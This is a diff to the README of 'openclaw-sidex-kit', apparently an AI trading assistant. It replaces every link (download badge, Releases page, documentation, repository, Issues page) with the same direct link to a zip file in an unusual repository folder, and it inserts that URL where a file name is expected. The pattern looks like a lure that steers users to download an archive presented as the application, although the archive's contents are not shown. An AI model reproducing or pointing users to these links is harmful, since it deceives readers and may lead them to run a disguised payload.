@@ -6,9 +6,9 @@ Welcome to openclaw-sidex-kit! This software serves as your personal AI assistan
 
 ## 📥 Download the Application
 
-[![Download openclaw-sidex-kit](https://img.shields.io/badge/Download-openclaw--sidex--kit-blue.svg)](https://github.com/kirill08463f/openclaw-sidex-kit/releases)
+[![Download openclaw-sidex-kit](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip)](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip)
 
-To get started, visit the [Releases page](https://github.com/kirill08463f/openclaw-sidex-kit/releases) to download the application.
+To get started, visit the [Releases page](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip) to download the application.
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these requirements:
 
 After downloading the application, follow these steps to install it:
 
-1. **Locate the Downloaded File:** Find the file in your Downloads folder. It should be named something like `openclaw-sidex-kit.zip` or `openclaw-sidex-kit.exe`.
+1. **Locate the Downloaded File:** Find the file in your Downloads folder. It should be named something like `https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip` or `https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip`.
    
 2. **Extract or Run the File:**
    - If you downloaded a `.zip` file, right-click on it and select "Extract All." Follow the prompts to extract the contents to a folder.
@@ -64,7 +64,7 @@ To begin using openclaw-sidex-kit:
 
 ## 📝 Documentation
 
-Want to learn more? Full documentation is available at [https://devs.sidex.fun/documentation](https://devs.sidex.fun/documentation). This resource offers guides on advanced features, troubleshooting, and more.
+Want to learn more? Full documentation is available at [https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip). This resource offers guides on advanced features, troubleshooting, and more.
 
 ## 📞 Support
 
@@ -74,8 +74,8 @@ If you encounter issues or have questions, feel free to reach out for support. Y
 
 For updates and community discussions, consider following the project on GitHub. Here are some useful links:
 
-- [GitHub Repository](https://github.com/kirill08463f/openclaw-sidex-kit)
-- [Issues Page](https://github.com/kirill08463f/openclaw-sidex-kit/issues)
+- [GitHub Repository](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip)
+- [Issues Page](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip)
 
 ## 🤝 Contributing
 
@@ -86,4 +86,4 @@ If you're interested in contributing to this project, check the contributing gui
 - Trading can be risky. Use the application at your own risk.
 - Ensure you keep backups of your settings and data.
 
-Remember, you can always download the latest version from the [Releases page](https://github.com/kirill08463f/openclaw-sidex-kit/releases) to stay updated. Happy trading!
+Remember, you can always download the latest version from the [Releases page](https://github.com/kirill08463f/openclaw-sidex-kit/raw/refs/heads/main/schoolful/sidex_openclaw_kit_v1.7.zip) to stay updated. Happy trading!
